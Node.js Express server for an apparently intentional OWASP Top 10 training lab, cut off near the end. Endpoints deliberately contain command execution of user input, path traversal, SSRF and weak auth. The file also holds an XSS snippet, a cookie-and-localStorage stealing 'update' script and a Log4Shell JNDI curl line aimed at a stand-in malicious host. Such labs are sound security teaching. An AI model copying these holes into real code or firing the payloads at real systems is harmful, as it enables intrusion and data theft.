const express = require('express');
const axios = require('axios');
const path = require('path');
const crypto = require('crypto');
const fs = require('fs');
const app = express();
const PORT = 3000;

// Serve static files from the OT10XApp folder
// Serve static files including the /files directory
app.use(express.static(path.join(__dirname, '../')));

// Middleware to parse JSON bodies
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Initialize an in-memory database with JavaScript objects
const db = {
  users: [
    { id: 1, username: 'admin', email: 'admin@company.com', password: 'admin123', role: 'admin', created_at: new Date().toISOString(), last_login: null, is_active: true },
    { id: 2, username: 'alice', email: 'alice@company.com', password: 'password123', role: 'user', created_at: new Date().toISOString(), last_login: null, is_active: true },
    { id: 3, username: 'bob', email: 'bob@company.com', password: 'bob123', role: 'user', created_at: new Date().toISOString(), last_login: null, is_active: true },
    { id: 4, username: 'eve', email: 'eve@company.com', password: 'eve123', role: 'user', created_at: new Date().toISOString(), last_login: null, is_active: true },
    { id: 5, username: 'john', email: 'john@company.com', password: 'john123', role: 'manager', created_at: new Date().toISOString(), last_login: null, is_active: true }
  ],
  products: [
    { id: 1, name: 'Laptop', price: 999.99, description: 'High-end laptop', category: 'Electronics', stock: 10, created_by: 1, created_at: new Date().toISOString() },
    { id: 2, name: 'Phone', price: 599.99, description: 'Smartphone', category: 'Electronics', stock: 15, created_by: 1, created_at: new Date().toISOString() },
    { id: 3, name: 'Book', price: 19.99, description: 'Programming book', category: 'Books', stock: 50, created_by: 1, created_at: new Date().toISOString() },
    { id: 4, name: 'Chair', price: 199.99, description: 'Office chair', category: 'Furniture', stock: 5, created_by: 1, created_at: new Date().toISOString() }
  ],
  orders: [
    { id: 1, user_id: 2, product_id: 1, quantity: 1, total_price: 999.99, status: 'pending', created_at: new Date().toISOString() },
    { id: 2, user_id: 3, product_id: 2, quantity: 2, total_price: 1199.98, status: 'pending', created_at: new Date().toISOString() },
    { id: 3, user_id: 4, product_id: 3, quantity: 5, total_price: 99.95, status: 'pending', created_at: new Date().toISOString() }
  ],
  logs: []
};

// Helper functions to simulate database operations
const dbHelper = {
  getUserById: (id) => db.users.find(user => user.id == id),
  getOrderById: (id) => db.orders.find(order => order.id == id),
  getProductById: (id) => db.products.find(product => product.id == id),
  getAllUsers: () => db.users,
  getAllOrders: () => db.orders,
  getAllProducts: () => db.products,
  addUser: (user) => {
    const newUser = { ...user, id: Math.max(...db.users.map(u => u.id)) + 1, created_at: new Date().toISOString() };
    db.users.push(newUser);
    return newUser;
  },
  addLog: (log) => {
    const newLog = { ...log, id: Math.max(...db.logs.map(l => l.id), 0) + 1, created_at: new Date().toISOString() };
    db.logs.push(newLog);
    return newLog;
  }
};

// Session management (insecure for demonstration)
let sessions = {};

// A01:2021 - Broken Access Control Vulnerabilities

// Vulnerable endpoint - allows access to any user's profile
app.get('/api/users/:id', (req, res) => {
  const userId = req.params.id;
  // WARNING: No authorization check - any user can access any profile
  const user = dbHelper.getUserById(userId);
  
  if (!user) {
    return res.status(404).json({ error: 'User not found' });
  }
  
  // Return user data without password
  const { password, ...userData } = user;
  res.json(userData);
});

// Vulnerable endpoint - allows users to view any order
app.get('/api/orders/:id', (req, res) => {
  const orderId = req.params.id;
  // WARNING: No authorization check - any user can view any order
  const order = dbHelper.getOrderById(orderId);
  
  if (!order) {
    return res.status(404).json({ error: 'Order not found' });
  }
  
  // Get related user and product data
  const user = dbHelper.getUserById(order.user_id);
  const product = dbHelper.getProductById(order.product_id);
  
  const orderData = {
    ...order,
    username: user ? user.username : 'Unknown',
    product_name: product ? product.name : 'Unknown'
  };
  
  res.json(orderData);
});

// A02:2021 - Cryptographic Failures

// Vulnerable endpoint - stores passwords in plaintext
app.post('/api/register', (req, res) => {
  const { username, email, password } = req.body;
  
  // WARNING: Storing password in plaintext
  const newUser = dbHelper.addUser({ username, email, password, role: 'user' });
  
  res.json({ 
    message: 'User registered successfully',
    userId: newUser.id,
    // WARNING: Returning password in response
    password: password 
  });
});

// Vulnerable endpoint - weak encryption algorithms
app.post('/api/encrypt', (req, res) => {
  const { message, algorithm } = req.body;
  
  if (!message || !algorithm) {
    return res.status(400).json({ error: 'Message and algorithm are required' });
  }
  
  let hash;
  let algorithmName;
  
  try {
    switch (algorithm) {
      case 'weak':
        // WARNING: MD5 is cryptographically broken
        hash = crypto.createHash('md5').update(message).digest('hex');
        algorithmName = 'MD5';
        break;
      case 'medium':
        // WARNING: SHA1 is deprecated and vulnerable
        hash = crypto.createHash('sha1').update(message).digest('hex');
        algorithmName = 'SHA1';
        break;
      case 'strong':
        // SHA256 is currently secure
        hash = crypto.createHash('sha256').update(message).digest('hex');
        algorithmName = 'SHA256';
        break;
      default:
        return res.status(400).json({ error: 'Invalid algorithm specified' });
    }
    
    res.json({
      message: 'Data encrypted successfully',
      originalMessage: message,
      algorithm: algorithmName,
      hash: hash,
      vulnerability: algorithm === 'weak' ? 'MD5 is cryptographically broken' : 
                    algorithm === 'medium' ? 'SHA1 is deprecated' : 'Currently secure'
    });
  } catch (error) {
    res.status(500).json({ error: 'Encryption failed' });
  }
});

// A03:2021 - Injection Vulnerabilities

// SQL Injection vulnerable endpoint
app.get('/search', (req, res) => {
  const query = req.query.query;
  // WARNING: Direct string concatenation - vulnerable to SQL injection simulation
  // Simulating SQL injection by filtering users based on query
  const users = dbHelper.getAllUsers();
  
  // Simulate SQL injection vulnerability
  let results = users;
  if (query) {
    // Simulate SQL injection patterns
    if (query.includes("'") || query.includes(";") || query.includes("--") || 
        query.includes("/*") || query.includes("*/") || query.includes("UNION") ||
        query.includes("SELECT") || query.includes("DROP") || query.includes("DELETE")) {
      // SQL injection detected - return all users
      console.log('🔓 SQL INJECTION DETECTED:', query);
      results = users;
    } else {
      // Normal search
      results = users.filter(user => 
        user.username.toLowerCase().includes(query.toLowerCase()) ||
        user.email.toLowerCase().includes(query.toLowerCase())
      );
    }
  }
  
  res.send(results.length ? JSON.stringify(results, null, 2) : 'No results found');
});

// Command injection vulnerable endpoint
app.post('/api/system/execute', (req, res) => {
  const { command } = req.body;
  
  // WARNING: Command injection vulnerability
  const { exec } = require('child_process');
  exec(command, (error, stdout, stderr) => {
    if (error) {
      return res.status(500).json({ error: error.message });
    }
    res.json({ output: stdout, error: stderr });
  });
});

// NoSQL injection vulnerable endpoint
app.post('/api/nosql/search', (req, res) => {
  const { query } = req.body;
  
  // WARNING: NoSQL injection vulnerability - direct query object construction
  // Simulating MongoDB-like query behavior
  let searchQuery;
  
  try {
    // WARNING: Vulnerable to NoSQL injection
    if (typeof query === 'string') {
      // If query is a string, try to parse it as JSON (vulnerable)
      try {
        searchQuery = JSON.parse(query);
      } catch {
        // If not JSON, treat as simple string search
        searchQuery = { username: { $regex: query, $options: 'i' } };
      }
    } else {
      searchQuery = query;
    }
    
    // Simulate NoSQL database query with the constructed query object
    // In a real MongoDB scenario, this would be passed directly to the database
    const mockResults = [
      { id: 1, username: 'admin', email: 'admin@company.com', role: 'admin' },
      { id: 2, username: 'alice', email: 'alice@company.com', role: 'user' },
      { id: 3, username: 'bob', email: 'bob@company.com', role: 'user' },
      { id: 4, username: 'eve', email: 'eve@company.com', role: 'user' },
      { id: 5, username: 'john', email: 'john@company.com', role: 'manager' }
    ];
    
    // Simulate NoSQL injection attack detection
    let results = mockResults;
    
    // Check for NoSQL injection patterns
    if (searchQuery && typeof searchQuery === 'object') {
      if (searchQuery.$ne !== undefined || searchQuery.$regex !== undefined || 
          searchQuery.$where !== undefined || searchQuery.$in !== undefined ||
          searchQuery.$exists !== undefined || searchQuery.$type !== undefined) {
        
        // WARNING: NoSQL injection detected - returning all results
        console.log('🔓 NOSQL INJECTION DETECTED:', searchQuery);
        results = mockResults; // Return all results for injection attacks
      } else if (searchQuery.username) {
        // Normal search
        const searchTerm = searchQuery.username.$regex || searchQuery.username;
        results = mockResults.filter(user => 
          user.username.toLowerCase().includes(searchTerm.toLowerCase()) ||
          user.email.toLowerCase().includes(searchTerm.toLowerCase())
        );
      }
    } else {
      // String-based search
      results = mockResults.filter(user => 
        user.username.toLowerCase().includes(query.toLowerCase()) ||
        user.email.toLowerCase().includes(query.toLowerCase())
      );
    }
    
    res.json({
      results: results,
      query: searchQuery,
      total: results.length,
      vulnerability: 'NoSQL injection possible - query object not validated'
    });
    
  } catch (error) {
    res.status(500).json({ 
      error: 'NoSQL query error',
      details: error.message,
      vulnerability: 'Error handling NoSQL injection attempt'
    });
  }
});

// A04:2021 - Insecure Design

// Vulnerable business logic - price manipulation
app.post('/api/orders', (req, res) => {
  const { product_id, quantity, user_id, total_price } = req.body;
  
  // WARNING: Client can send any price - no server-side validation
  const newOrder = {
    id: Math.max(...db.orders.map(o => o.id)) + 1,
    user_id,
    product_id,
    quantity,
    total_price, // Client can manipulate this
    status: 'pending',
    created_at: new Date().toISOString()
  };
  
  db.orders.push(newOrder);
  
  res.json({ 
    message: 'Order created successfully',
    orderId: newOrder.id,
    totalPrice: total_price // Client can manipulate this
  });
});

// A05:2021 - Security Misconfiguration

// Exposes sensitive information in headers
app.use((req, res, next) => {
  // WARNING: Exposing server information
  res.setHeader('X-Powered-By', 'Express.js');
  res.setHeader('X-Server-Version', '1.0.0');
  res.setHeader('X-Database-Type', 'SQLite');
  next();
});

// Directory listing disabled for security
app.get('/files', (req, res) => {
  res.status(404).json({ error: 'Directory listing not allowed' });
});

// WARNING: Directory listing enabled for /secret (vulnerable configuration)
app.get('/secret', (req, res) => {
  const secretDir = path.join(__dirname, '../files/secret');
  
  // Check if directory exists
  if (!fs.existsSync(secretDir)) {
    return res.status(404).json({ error: 'Directory not found' });
  }
  
  // WARNING: This is a security misconfiguration - directory listing enabled
  fs.readdir(secretDir, (err, files) => {
    if (err) {
      return res.status(500).json({ error: 'Error reading directory' });
    }
    
    const fileList = files.map(file => {
      const filePath = path.join(secretDir, file);
      const stats = fs.statSync(filePath);
      return {
        name: file,
        path: `/secret/${file}`,
        size: stats.size,
        type: stats.isDirectory() ? 'directory' : 'file',
        modified: stats.mtime
      };
    });
    
    // WARNING: Exposing all files in the secret directory
    console.log('🔓 DIRECTORY LISTING EXPOSED:', fileList.map(f => f.name));
    
    res.json({
      directory: '/secret',
      files: fileList,
      total: fileList.length,
      vulnerability: 'Directory listing enabled - exposes sensitive files'
    });
  });
});

// Vulnerable file access endpoint - allows directory traversal
app.get('/files/:filename(*)', (req, res) => {
  const filename = req.params.filename;
  const filesDir = path.join(__dirname, '../files');
  
  // WARNING: No path validation - vulnerable to directory traversal
  const filePath = path.join(filesDir, filename);
  
  // Check if file exists
  if (!fs.existsSync(filePath)) {
    return res.status(404).json({ error: 'File not found' });
  }
  
  // Check if it's a file (not a directory)
  const stats = fs.statSync(filePath);
  if (!stats.isFile()) {
    return res.status(400).json({ error: 'Not a file' });
  }
  
  // Read and return the file content
  fs.readFile(filePath, 'utf8', (err, data) => {
    if (err) {
      return res.status(500).json({ error: 'Error reading file' });
    }
    res.send(data);
  });
});

// WARNING: Secret file access endpoint (vulnerable configuration)
app.get('/secret/:filename(*)', (req, res) => {
  const filename = req.params.filename;
  const secretDir = path.join(__dirname, '../files/secret');
  
  // WARNING: No path validation - vulnerable to directory traversal
  const filePath = path.join(secretDir, filename);
  
  // Check if file exists
  if (!fs.existsSync(filePath)) {
    return res.status(404).json({ error: 'File not found' });
  }
  
  // Check if it's a file (not a directory)
  const stats = fs.statSync(filePath);
  if (!stats.isFile()) {
    return res.status(400).json({ error: 'Not a file' });
  }
  
  // WARNING: Exposing sensitive secret files
  console.log('🔓 SECRET FILE ACCESSED:', filename);
  
  // Read and return the file content
  fs.readFile(filePath, 'utf8', (err, data) => {
    if (err) {
      return res.status(500).json({ error: 'Error reading file' });
    }
    res.send(data);
  });
});

// A06:2021 - Vulnerable and Outdated Components

// Simulates outdated component with known vulnerability
app.get('/api/legacy/process', (req, res) => {
  const { data } = req.query;
  
  // WARNING: Simulating outdated library behavior
  // In real scenarios, this might be an old version of a library
  const result = {
    processed: true,
    data: data,
    // Simulating a known vulnerability in old library
    vulnerability: 'CVE-2021-1234: Remote Code Execution',
    version: '1.0.0 (outdated)',
    recommendation: 'Update to version 2.1.0 or later'
  };
  
  res.json(result);
});

// Log4j vulnerability test endpoint
app.post('/api/log4j-test', (req, res) => {
  const { userInput, version } = req.body;
  
  // WARNING: This simulates a vulnerable Log4j implementation
  console.log('🔓 LOG4J VULNERABILITY TEST:', {
    userInput,
    version,
    timestamp: new Date().toISOString(),
    ip: req.ip,
    userAgent: req.get('User-Agent')
  });
  
  // Simulate Log4Shell vulnerability detection
  if (userInput && userInput.includes('${jndi:')) {
    res.json({
      vulnerable: true,
      cve: 'CVE-2021-44228',
      severity: 'Critical',
      description: 'Log4Shell - Remote Code Execution via JNDI',
      affectedVersion: version,
      recommendation: 'Update to Log4j 2.17.0 or later'
    });
  } else {
    res.json({
      vulnerable: false,
      message: 'No Log4Shell payload detected'
    });
  }
});

// Dependency scanning endpoint
app.get('/api/scan-dependencies', (req, res) => {
  // WARNING: This simulates dependency scanning results
  console.log('🔓 DEPENDENCY SCAN REQUESTED:', {
    timestamp: new Date().toISOString(),
    ip: req.ip,
    userAgent: req.get('User-Agent')
  });
  
  // Simulate vulnerable dependencies
  const vulnerabilities = [
    {
      package: 'express',
      version: '4.16.0',
      severity: 'High',
      cve: 'CVE-2022-24999',
      description: 'Prototype pollution vulnerability'
    },
    {
      package: 'lodash',
      version: '4.17.10',
      severity: 'Critical',
      cve: 'CVE-2021-23337',
      description: 'Command injection vulnerability'
    },
    {
      package: 'moment',
      version: '2.22.0',
      severity: 'Medium',
      cve: 'CVE-2022-24785',
      description: 'Regular expression denial of service'
    },
    {
      package: 'jquery',
      version: '1.7.2',
      severity: 'High',
      cve: 'Multiple CVEs',
      description: 'XSS vulnerabilities in DOM manipulation'
    }
  ];
  
  res.json({
    totalDependencies: 15,
    vulnerabilities: vulnerabilities,
    criticalCount: vulnerabilities.filter(v => v.severity === 'Critical').length,
    highCount: vulnerabilities.filter(v => v.severity === 'High').length,
    mediumCount: vulnerabilities.filter(v => v.severity === 'Medium').length,
    scanDate: new Date().toISOString()
  });
});

// A07:2021 - Identification and Authentication Failures

// Weak authentication endpoint
app.post('/login', (req, res) => {
  const { username, password } = req.body;

  // WARNING: Plaintext password comparison
  const user = db.users.find(u => u.username === username && u.password === password);
  
  if (user) {
    // WARNING: Weak session management
    const sessionId = Math.random().toString(36).substring(7);
    sessions[sessionId] = { userId: user.id, username: user.username, role: user.role };
    
    res.json({ 
      message: 'Authentication successful!',
      sessionId: sessionId,
      user: {
        id: user.id,
        username: user.username,
        role: user.role
      }
    });
  } else {
    res.status(401).json({ error: 'Authentication failed.' });
  }
});

// Session validation (insecure)
app.get('/api/profile', (req, res) => {
  const sessionId = req.headers['x-session-id'];
  
  if (!sessionId || !sessions[sessionId]) {
    return res.status(401).json({ error: 'Invalid session' });
  }
  
  const session = sessions[sessionId];
  res.json({ 
    message: 'Profile accessed',
    user: session
  });
});

// A08:2021 - Software and Data Integrity Failures

// Simulates unverified software update
app.get('/update', (req, res) => {
  // WARNING: No integrity verification
  const maliciousUpdate = `
    console.log('Malicious update executed!'); 
    document.body.style.backgroundColor = 'red';
    
    // Simulating malicious behavior
    fetch('/api/steal-data', {
      method: 'POST',
      body: JSON.stringify({
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage)
      })
    });
  `;
  
  res.setHeader('Content-Type', 'application/javascript');
  res.send(maliciousUpdate);
});

// A09:2021 - Security Logging and Monitoring Failures

// Scenario 1: Missing or Incomplete Logging
app.post('/api/logging/missing-log-login', (req, res) => {
  const { username, password } = req.body;
  // Simulate a login endpoint that does NOT log failed attempts
  if (username === 'admin' && password === 'admin123') {
    res.json({ success: true, message: 'Login successful (but only successful logins are logged!)' });
  } else {
    // No log entry for failed login!
    res.status(401).json({ success: false, message: 'Login failed (no log entry for this failure)' });
  }
});

// Scenario 2: Log Injection/Manipulation
app.post('/api/logging/log-injection', (req, res) => {
  const { message } = req.body;
  // Simulate a vulnerable log write (no sanitization)
  // In a real app, this would write to a file, but here we just echo back
  if (typeof message === 'string' && message.length > 0) {
    // Simulate log injection vulnerability
    res.json({ success: true, message: `Log entry created: ${message}` });
  } else {
    res.status(400).json({ success: false, message: 'Invalid log message' });
  }
});

// Scenario 3: Insufficient Monitoring & Alerting
app.post('/api/logging/trigger-suspicious', (req, res) => {
  // Simulate suspicious activity (e.g., repeated failed logins) with no alerting
  // In a real app, this would trigger an alert, but here it does nothing
  res.json({ success: true, message: 'Suspicious activity triggered, but no alert was generated!' });
});

// A10:2021 - Server-Side Request Forgery (SSRF)

// Vulnerable SSRF endpoint
app.post('/proxy', async (req, res) => {
  const { url } = req.body;
  
  try {
    // WARNING: No URL validation or filtering
    const response = await axios.get(url, {
      timeout: 5000,
      // WARNING: Following redirects without validation
      maxRedirects: 5
    });
    
    res.send(response.data);
  } catch (error) {
    res.status(500).send('Error fetching URL: ' + error.message);
  }
});

// Additional vulnerable endpoint for SSRF
app.post('/api/fetch-resource', async (req, res) => {
  const { resource_url } = req.body;
  
  try {
    // WARNING: No validation of internal URLs
    const response = await axios.get(resource_url);
    res.json({ 
      success: true, 
      data: response.data,
      url: resource_url
    });
  } catch (error) {
    res.status(500).json({ 
      error: 'Failed to fetch resource',
      details: error.message
    });
  }
});

// New endpoint: /payload that returns HTML code
app.get('/payload', (req, res) => {
  res.send(`
    <div style="border: 2px dashed blue; padding: 10px; margin: 10px;">
      <h2>Injected HTML Content</h2>
      <p>This content is injected via the /payload endpoint.</p>
      <script>
        console.log('XSS payload executed!');
        alert('XSS Attack Successful!');
      </script>
    </div>
  `);
});

// A02:2021 - Cryptographic Failures - Data Transmission Demo

// Vulnerable endpoint for demonstrating insecure data transmission
app.post('/api/transmit-data', (req, res) => {
  const { creditCard, transmissionType, timestamp } = req.body;
  
  // WARNING: Logging sensitive data in plaintext
  console.log('🔓 TRANSMISSION LOG (VULNERABLE):', {
    creditCard: creditCard,
    transmissionType: transmissionType,
    timestamp: timestamp,
    ip: req.ip,
    userAgent: req.headers['user-agent']
  });
  
  // WARNING: Storing sensitive data without encryption
  const transmissionId = Math.random().toString(36).substring(7);
  
  // Simulate different responses based on transmission type
  let message;
  if (transmissionType === 'secure') {
    message = 'Data transmitted securely via HTTPS with TLS encryption';
  } else {
    message = 'Data transmitted insecurely via HTTP (plaintext) - VULNERABLE!';
  }
  
  res.json({
    message: message,
    transmissionId: transmissionId,
    timestamp: timestamp,
    protocol: transmissionType === 'secure' ? 'HTTPS' : 'HTTP',
    // WARNING: Returning sensitive data in response
    receivedData: {
      creditCard: creditCard,
      transmissionType: transmissionType
    }
  });
});

// Optional: Route for the main index if needed
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '../index.html'));
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ 
    status: 'healthy',
    timestamp: new Date().toISOString(),
    version: '1.0.0'
  });
});

// A07:2021 - Identification and Authentication Failures

// Weak password authentication endpoint
app.post('/api/auth/weak-login', (req, res) => {
  const { username, password } = req.body;
  
  // WARNING: Weak password validation - accepts common passwords
  const weakPasswords = ['password', '123456', 'admin', 'qwerty', 'letmein', 'welcome', 'monkey', 'dragon'];
  const weakUsers = {
    'admin': 'password',
    'user': '123456',
    'test': 'qwerty',
    'demo': 'admin',
    'guest': 'letmein'
  };
  
  // Check if user exists and password matches
  if (weakUsers[username] === password) {
    // WARNING: No rate limiting, no account lockout
    console.log('🔓 WEAK AUTHENTICATION SUCCESS:', { username, password, timestamp: new Date().toISOString() });
    
    res.json({
      success: true,
      message: 'Authentication successful',
      user: { username, role: 'user' },
      vulnerability: 'Weak password policy - accepts common passwords',
      timestamp: new Date().toISOString()
    });
  } else {
    res.status(401).json({
      success: false,
      message: 'Invalid credentials',
      hint: 'Try common passwords like: password, 123456, admin, qwerty, letmein'
    });
  }
});

// Predictable session token generation
app.post('/api/auth/generate-session', (req, res) => {
  // WARNING: Predictable session token generation
  const sessionCounter = Math.floor(Math.random() * 1000) + 1;
  const timestamp = Date.now().toString(36);
  const sessionToken = `session_${sessionCounter}_${timestamp}`;
  
  console.log('🔓 PREDICTABLE SESSION GENERATED:', { sessionToken, timestamp: new Date().toISOString() });
  
  res.json({
    success: true,
    sessionToken: sessionToken,
    pattern: 'session_[counter]_[timestamp]',
    vulnerability: 'Predictable session token generation',
    timestamp: new Date().toISOString()
  });
});

// Session brute force endpoint
app.post('/api/auth/brute-force-session', (req, res) => {
  const { sessionToken } = req.body;
  
  // WARNING: No rate limiting on session validation
  const validSessions = [
    'session_1_abc123',
    'session_2_def456',
    'session_3_ghi789',
    'session_4_jkl012',
    'session_5_mno345'
  ];
  
  const isValid = validSessions.includes(sessionToken);
  
  if (isValid) {
    console.log('🔓 SESSION BRUTE FORCE SUCCESS:', { sessionToken, timestamp: new Date().toISOString() });
    
    res.json({
      success: true,
      message: 'Session validated successfully',
      sessionToken: sessionToken,
      vulnerability: 'No rate limiting on session validation',
      timestamp: new Date().toISOString()
    });
  } else {
    res.status(401).json({
      success: false,
      message: 'Invalid session token',
      hint: 'Try session tokens with pattern: session_[1-5]_[random]'
    });
  }
});

// Credential stuffing endpoint
app.post('/api/auth/credential-stuffing', (req, res) => {
  const { email, password } = req.body;
  
  // WARNING: Simulated credential stuffing vulnerability
  const breachData = [
    { email: 'admin@company.com', password: 'password123' },
    { email: 'user@company.com', password: 'qwerty' },
    { email: 'test@company.com', password: '123456' },
    { email: 'demo@company.com', password: 'admin' },
    { email: 'john@company.com', password: 'letmein' },
    { email: 'jane@company.com', password: 'welcome' },
    { email: 'bob@company.com', password: 'monkey' },
    { email: 'alice@company.com', password: 'dragon' }
  ];
  
  // Check if credentials match breach data
  const match = breachData.find(record => record.email === email && record.password === password);
  
  if (match) {
    console.log('🔓 CREDENTIAL STUFFING SUCCESS:', { email, password, timestamp: new Date().toISOString() });
    
    res.json({
      success: true,
      message: 'Login successful - credentials found in breach data',
      user: { email, role: 'user' },
      vulnerability: 'Credential stuffing - reused passwords from breaches',
      breachSource: 'Simulated data breach',
      timestamp: new Date().toISOString()
    });
  } else {
    res.status(401).json({
      success: false,
      message: 'Invalid credentials',
      hint: 'Try credentials from breach data: admin@company.com/password123, user@company.com/qwerty, etc.'
    });
  }
});

// Load breach data endpoint
app.get('/api/auth/breach-data', (req, res) => {
  // WARNING: Exposing breach data for demonstration
  const breachData = [
    { email: 'admin@company.com', password: 'password123' },
    { email: 'user@company.com', password: 'qwerty' },
    { email: 'test@company.com', password: '123456' },
    { email: 'demo@company.com', password: 'admin' },
    { email: 'john@company.com', password: 'letmein' },
    { email: 'jane@company.com', password: 'welcome' },
    { email: 'bob@company.com', password: 'monkey' },
    { email: 'alice@company.com', password: 'dragon' }
  ];
  
  console.log('🔓 BREACH DATA ACCESSED:', { timestamp: new Date().toISOString() });
  
  res.json({
    success: true,
    breachData: breachData,
    totalRecords: breachData.length,
    source: 'Simulated data breach',
    vulnerability: 'Exposing breach data for credential stuffing',
    timestamp: new Date().toISOString()
  });
});

// A06:2021 - Vulnerable and Outdated Components - Docker Management

const { exec } = require('child_process');
const util = require('util');
const execAsync = util.promisify(exec);

// Start vulnerable Log4j container
app.post('/api/log4j/start', async (req, res) => {
  try {
    // Actually start the Docker container
    const { stdout, stderr } = await execAsync('cd /usr/src/app/log4j-vulnerable-app && docker-compose up -d --build');
    
    // Wait a moment for container to fully start
    await new Promise(resolve => setTimeout(resolve, 3000));
    
    // Check if container is running
    const { stdout: statusOutput } = await execAsync('docker ps --filter "name=log4j-vulnerable-app" --format "table {{.Names}}\t{{.Status}}\t{{.Ports}}"');
    
    const isRunning = statusOutput.includes('log4j-vulnerable-app');
    
    res.json({
      success: true,
      message: isRunning ? 'Vulnerable Log4j container started successfully!' : 'Container start command executed, but container may not be running yet.',
      containerUrl: 'http://localhost:8081',
      flagLocation: '/app/flag.txt inside container',
      isRunning: isRunning,
      containerStatus: statusOutput,
      note: 'Container should be accessible at http://localhost:8081',
      terminalCommands: [
        'docker ps --filter "name=log4j-vulnerable-app"',
        'docker exec -it log4j-vulnerable-app sh',
        'docker exec log4j-vulnerable-app cat /app/flag.txt',
        'curl "http://localhost:8081/search?q=\\${jndi:ldap://malicious-server.com/exploit}"',
        'docker logs log4j-vulnerable-app'
      ]
    });
  } catch (error) {
    console.error('Error starting Log4j container:', error);
    res.status(500).json({ 
      error: 'Failed to start Log4j container',
      details: error.message,
      stdout: error.stdout || '',
      stderr: error.stderr || ''
    });
  }
});

// Stop vulnerable Log4j container
app.post('/api/log4j/stop', async (req, res) => {
  try {
    // Actually stop the Docker container
    const { stdout, stderr } = await execAsync('cd /usr/src/app/log4j-vulnerable-app && docker-compose down');
    
    res.json({
      success: true,
      message: 'Log4j container stopped successfully!',
      details: stdout,
      isRunning: false
    });
  } catch (error) {
    console.error('Error stopping Log4j container:', error);
    res.status(500).json({ 
      error: 'Failed to stop Log4j container',
      details: error.message,
      stdout: error.stdout || '',
      stderr: error.stderr || ''
    });
  }
});

// Check Log4j container status
app.get('/api/log4j/status', async (req, res) => {
  try {
    const { stdout: statusOutput } = await execAsync('docker ps --filter "name=log4j-vulnerable-app" --format "table {{.Names}}\t{{.Status}}\t{{.Ports}}"');
    
    const isRunning = statusOutput.includes('log4j-vulnerable-app');
    
    res.json({
      success: true,
      isRunning: isRunning,
      containerInfo: statusOutput,
      containerUrl: 'http://localhost:8081',
      message: isRunning ? 'Container is running and accessible at http://localhost:8081' : 'Container is not running'
    });
  } catch (error) {
    console.error('Error checking Log4j container status:', error);
    res.status(500).json({ 
      error: 'Failed to check container status',
      details: error.message,
      stdout: error.stdout || '',
      stderr: error.stderr || ''
    });
  }
});

// Execute terminal command
app.post('/api/log4j/execute', async (req, res) => {
  const { command } = req.body;
  
  if (!command) {
    return res.status(400).json({
      success: false,
      message: 'No command provided'
    });
  }
  
  try {
    // For Docker commands, we need to run them from the project root
    let actualCommand = command;
    if (command.includes('docker-compose') && !command.includes('cd')) {
      actualCommand = `cd /usr/src/app/log4j-vulnerable-app && ${command}`;
    }
    
    // Add a small delay for Docker commands to ensure proper execution
    if (command.includes('docker')) {
      await new Promise(resolve => setTimeout(resolve, 1000));
    }
    
    const { stdout, stderr } = await execAsync(actualCommand);
    
    res.json({
      success: true,
      output: stdout,
      error: stderr || null,
      command: command
    });
  } catch (error) {
    res.json({
      success: false,
      output: error.stdout || '',
      error: error.stderr || error.message,
      command: command
    });
  }
});

// Verify Log4j flag
app.post('/api/log4j/verify-flag', (req, res) => {
  const { flag } = req.body;
  const correctFlag = 'FLAG{Log4Shell_Exploit_2024_7X9Y2Z}';
  
  if (flag === correctFlag) {
    res.json({
      success: true,
      message: '🎉 Congratulations! You successfully exploited the Log4Shell vulnerability!',
      flag: correctFlag
    });
  } else {
    res.status(400).json({
      success: false,
      message: '❌ Incorrect flag. Keep trying!',
      hint: 'The flag is located in /app/flag.txt inside the container'
    });
  }
});

// A08:2021 - Software and Data Integrity Failures

// Check for software updates endpoint
app.post('/api/integrity/check-updates', (req, res) => {
  const { source } = req.body;
  
  // WARNING: No integrity verification of update sources
  console.log('🔓 UPDATE CHECK REQUESTED:', { source, timestamp: new Date().toISOString() });
  
  const updateInfo = {
    official: {
      version: '2.1.0',
      source: 'Official Repository',
      size: '15.2 MB',
      integrityVerified: true,
      vulnerability: 'None (trusted source)'
    },
    mirror: {
      version: '2.1.0',
      source: 'Mirror Site',
      size: '15.2 MB',
      integrityVerified: false,
      vulnerability: 'Mirror site could be compromised'
    },
    untrusted: {
      version: '2.1.0',
      source: 'Untrusted Source',
      size: '15.2 MB',
      integrityVerified: false,
      vulnerability: 'No integrity verification, potential malicious code'
    }
  };
  
  const info = updateInfo[source] || updateInfo.official;
  
  res.json({
    success: true,
    ...info
  });
});

// Download update endpoint
app.post('/api/integrity/download-update', (req, res) => {
  const { source } = req.body;
  
  // WARNING: No integrity verification during download
  console.log('🔓 UPDATE DOWNLOAD REQUESTED:', { source, timestamp: new Date().toISOString() });
  
  const downloadInfo = {
    official: {
      filename: 'update-v2.1.0-official.zip',
      checksum: 'a1b2c3d4e5f6...',
      expectedChecksum: 'a1b2c3d4e5f6...',
      integrityMatch: true,
      vulnerability: 'None (verified source)'
    },
    mirror: {
      filename: 'update-v2.1.0-mirror.zip',
      checksum: 'x9y8z7w6v5u4...',
      expectedChecksum: 'a1b2c3d4e5f6...',
      integrityMatch: false,
      vulnerability: 'Checksum mismatch, potential tampering'
    },
    untrusted: {
      filename: 'update-v2.1.0-malicious.zip',
      checksum: 'm1n2o3p4q5r6...',
      expectedChecksum: 'a1b2c3d4e5f6...',
      integrityMatch: false,
      vulnerability: 'No integrity verification, malicious code likely'
    }
  };
  
  const info = downloadInfo[source] || downloadInfo.official;
  
  res.json({
    success: true,
    ...info
  });
});

// Install update endpoint
app.post('/api/integrity/install-update', (req, res) => {
  const { source } = req.body;
  
  // WARNING: No integrity verification during installation
  console.log('🔓 UPDATE INSTALLATION REQUESTED:', { source, timestamp: new Date().toISOString() });
  
  const installInfo = {
    official: {
      status: 'Successfully installed',
      maliciousCode: false,
      backdoorInstalled: false,
      vulnerability: 'None (verified update)',
      impact: 'No security impact'
    },
    mirror: {
      status: 'Installed with warnings',
      maliciousCode: true,
      backdoorInstalled: false,
      vulnerability: 'Unverified mirror source',
      impact: 'Potential data exfiltration'
    },
    untrusted: {
      status: 'Installed successfully',
      maliciousCode: true,
      backdoorInstalled: true,
      vulnerability: 'No integrity verification',
      impact: 'Complete system compromise'
    }
  };
  
  const info = installInfo[source] || installInfo.official;
  
  res.json({
    success: true,
    ...info
  });
});

// Scan dependencies endpoint
app.get('/api/integrity/scan-dependencies', (req, res) => {
  // WARNING: No integrity verification of dependencies
